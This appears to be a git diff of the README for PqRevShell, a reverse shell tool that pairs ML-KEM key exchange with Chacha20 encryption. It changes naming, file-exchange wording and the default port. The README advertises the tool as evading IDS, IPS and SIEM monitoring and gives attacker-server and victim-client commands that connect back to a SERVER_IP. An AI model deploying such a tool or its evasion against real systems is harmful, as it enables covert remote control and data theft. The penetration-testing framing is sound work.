@@ -1,8 +1,8 @@
 Work In Progress WIP.
 All credits to OusCyb3rH4ck.
 
-# PQRevShell
-PQRevShell is a **secure reverse shell tool** that utilizes **ML-KEM (aka Kyber)** for secure key exchange and **Chacha20 encryption** to ensure encrypted communication between a client and a server. This project demonstrates a robust and secure way to establish a command execution environment, where commands issued by the server are securely transmitted to the client and executed, with responses being sent back in an encrypted format.
+# PqRevShell
+PqRevShell is a **secure reverse shell tool** that utilizes **ML-KEM (aka Kyber)** for secure key exchange and **Chacha20 encryption** to ensure encrypted communication between a client and a server. This project demonstrates a robust and secure way to establish a command execution environment, where commands issued by the server are securely transmitted to the client and executed, with responses being sent back in an encrypted format.
 
 By leveraging **ML-KEM + HKDF** for key exchange and **Chacha20 encryption**, this tool is designed to bypass traditional security systems such as **Intrusion Detection Systems (IDS), Intrusion Prevention Systems (IPS), and Security Information and Event Management (SIEM)** systems, making it a powerful tool for penetration testing in environments with strict monitoring.
 
@@ -10,7 +10,7 @@ By leveraging **ML-KEM + HKDF** for key exchange and **Chacha20 encryption**, th
 - **ML-KEM Key Exchange:** Post-Quantum Secure key exchange using ML-KEM to prevent Man-in-the-Middle (MITM) attacks.
 - **HKDF Key Derivation:** Derives a secure Chacha20 key and IV using HMAC-based Key Derivation Function (HKDF).
 - **Chacha20 Encryption:** Encrypts all communication between the client and server.
-- **File exchange:** File upload/download from the client.
+- **File exchange:** File exchange(upload/download) with the victim.
 - **Client-Server Architecture:** Reverse shell functionality with encrypted command execution.
 - **Resistance to MITM:** ECDH ensures that even if an attacker intercepts the communication, they cannot decrypt the data.
 - **Bypass of IDS/IPS/SIEM:** Chacha20 encryption hides the command and control traffic, making it difficult to detect by network monitoring systems.
@@ -37,8 +37,8 @@ By leveraging **ML-KEM + HKDF** for key exchange and **Chacha20 encryption**, th
 
 2. Clone the repository:
    ```bash
-   git clone https://github.com/JuanPardos/PQRevShell
-   cd PQRevShell
+   git clone https://github.com/JuanPardos/PqRevShell
+   cd PqRevShell
    ```
 
 3. Make the scripts executable (Optional):
@@ -49,15 +49,15 @@ By leveraging **ML-KEM + HKDF** for key exchange and **Chacha20 encryption**, th
 ## **Usage**
 
 #### **Server (attacker):**
-Start the server (attacker) with the desired IP and port:
+Start the server (attacker) with the desired port (defaults to 5050 if empty):
 ```bash
-./server.py -i 0.0.0.0 -p 443
+./server.py -p PORT*
 ```
 
 #### **Client (victim):**
-Connect the client (victim) to the server:
+Connect the client (victim) to the server. Port is opcional, defaults to 5050:
 ```bash
-./client.py -s SERVER_IP -p PORT
+./client.py -s SERVER_IP/HOSTNAME -p PORT*
 ```
 
 ### **Security Features**
